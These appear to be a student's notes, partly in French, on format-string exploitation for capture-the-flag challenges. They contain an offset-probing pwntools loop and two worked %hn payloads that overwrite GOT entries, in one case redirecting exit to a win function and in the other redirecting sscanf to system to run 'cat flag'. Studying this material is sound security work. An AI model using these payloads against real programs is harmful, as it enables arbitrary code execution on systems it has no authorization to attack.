
%n in printf : ("abc%n", &i) : 3 dans la valeur i car abc = 3 characters
use to detect canary

("%200x%n", i) => i = 200
("%150$x") argument 150 
("%x%x(=c)%x2$x(=c)", 1, C,3)

```python
for i in range(8):  
    s = process('./format')  
    payload = f'AAAABBBB%{i}$x'.encode()  
    # payload = f'%{i}$p'.encode()  
    s.sendline(payload)  
    res = s.recvline(timeout=3)  
    print(f"{i}: {res}")  
    sleep(1)
    
```
## Example 1

```c
  
void win() {  
    char buf[0x1000];  
  
    int fd = open("flag", O_RDONLY);  
    int sz = read(fd, buf, 0x1000);  
  
    write(1, buf, sz);  
    fflush(NULL);  
}  
  
static void handle_client() {  
    char buffer[512];  
    int sz;  
  
    sz = read(1, buffer, sizeof(buffer));  
    buffer[sz] = 0;  
  
    PRINTF(buffer);  
  
    exit(1);  
}
```

```python
buf = p32(0x0804C024) # 0804C024 addr of exit  
buf += b'%.37810x%7$hn' # 37814 080493B6 // .addr in dec of win then %hn
```


%7 => trouvé l'offset où on peut ecrire
```buf = b'AAAABBBB%7$x'```
![[Pasted image 20231118211443.png]]

0x0804 93B6 = addr of win function in .text
93B6 => 37814 in dec (-4 car addr de retours p32(@exit) = 4)
%hn =>write a short (2 bytes) at the address.
On ecrit que la moitier car la fonction win n'a jamais été apl et donc son addresse n'est pas dans la GOT

## Example 2

```c
  
static Action get_action(void)  
{  
    char choice[15];  
    Action action;  
  
    while (1)  
    {  
        PRINTF("Action: ");  
        fgets(choice, sizeof(choice), stdin);  
        if (sscanf(choice, "%u", &action))  
            return action;  
    }  
}  
  
  
static int menu(char *user)  
{  
  system("/usr/bin/clear");  
  PRINTF("Welcome to my app");  
  
  if (!strlen(user))  
  {  
    PRINTF("\n\nUser name : ");  
    fgets(user, 49, stdin);  
    remove_newline(user);  
    return 1;  
  }  
  else  
  {  
    PRINTF("Hello '");  
    PRINTF(user);  
    PRINTF("', what would you like to do ?\n");  
    PRINTF(" %u. Process authentification\n", Authenticate);  
    PRINTF(" %u. Exit this cool program\n", Exit);  
    switch (get_action())  
    {  
      case Authenticate:  
        authenticate();  
        return 1;  
      case Exit:  
        return 0;  
    }  
  
  }  
}
```

```python
buf = b'AA' # padding bytes
buf += p32(0x0804C040 + 2)  # 0804C040 addr of sscanf + 2 because we want to write to the second part of addr of sscanf  
buf += p32(0x0804C040)  # 0804C040 addr of sscanf  
buf += b'%.2042x%16$hn' # addr of system :  0804 = 2052 - 4 -4 -2  
buf += b'%.47144x%17$hn' # C02C = 49196 - 2042- 4 -4 -2

target.sendline(buf)  
  
# Get action  
buf = b'cat flag'  
target.sendline(buf)
```

On prend exemple ici que l'addresse à déjà été résolu dans la GOT, on doit donc réécrire les l'addresse en entier
